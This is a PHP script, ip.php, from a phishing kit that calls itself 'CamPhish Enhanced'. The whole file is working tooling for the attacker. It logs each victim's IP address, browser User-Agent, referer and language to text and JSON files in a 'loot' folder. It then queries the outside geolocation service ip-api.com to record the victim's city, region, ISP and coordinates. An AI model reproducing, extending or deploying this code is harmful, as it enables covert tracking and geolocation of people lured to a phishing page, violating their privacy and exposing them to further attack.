<?php
/**
 * CamPhish Enhanced — ip.php (backward compatible + JSON mode)
 * Logs victim IP + User-Agent, supports JSON output
 */

// Get client IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

$browser = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$timestamp = date('Y-m-d H:i:s');

// ─── Legacy text logging (backward compat) ─────────────────────
$file = 'ip.txt';
$fp = fopen($file, 'a');
fwrite($fp, "IP: " . $ipaddress . "\r\n");
fwrite($fp, " User-Agent: " . $browser . "\r\n");
fwrite($fp, " Time: " . $timestamp . "\r\n");
fwrite($fp, "---\r\n");
fclose($fp);

// ─── JSON logging ──────────────────────────────────────────────
$json_file = __DIR__ . '/loot/ip_log.json';
$loot_dir = __DIR__ . '/loot';
if (!is_dir($loot_dir)) {
    mkdir($loot_dir, 0755, true);
}

$entry = [
    'ip' => $ipaddress,
    'user_agent' => $browser,
    'timestamp' => $timestamp,
    'referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '',
    'accept_language' => isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : ''
];

$entries = [];
if (file_exists($json_file)) {
    $existing = file_get_contents($json_file);
    $entries = json_decode($existing, true);
    if (!is_array($entries)) $entries = [];
}
$entries[] = $entry;
file_put_contents($json_file, json_encode($entries, JSON_PRETTY_PRINT));

// ─── IP Geolocation fallback ───────────────────────────────────
// Attempt server-side IP geo lookup as backup
$geo_url = "http://ip-api.com/json/" . urlencode($ipaddress) . "?fields=status,lat,lon,city,regionName,country,isp,query";
$geo_context = stream_context_create(['http' => ['timeout' => 3]]);
$geo_response = @file_get_contents($geo_url, false, $geo_context);

if ($geo_response) {
    $geo_data = json_decode($geo_response, true);
    if ($geo_data && isset($geo_data['status']) && $geo_data['status'] === 'success') {
        $geo_file = $loot_dir . '/ip_geolocation.json';
        $geo_entries = [];
        if (file_exists($geo_file)) {
            $existing = file_get_contents($geo_file);
            $geo_entries = json_decode($existing, true);
            if (!is_array($geo_entries)) $geo_entries = [];
        }
        $geo_data['timestamp'] = $timestamp;
        $geo_entries[] = $geo_data;
        file_put_contents($geo_file, json_encode($geo_entries, JSON_PRETTY_PRINT));
    }
}
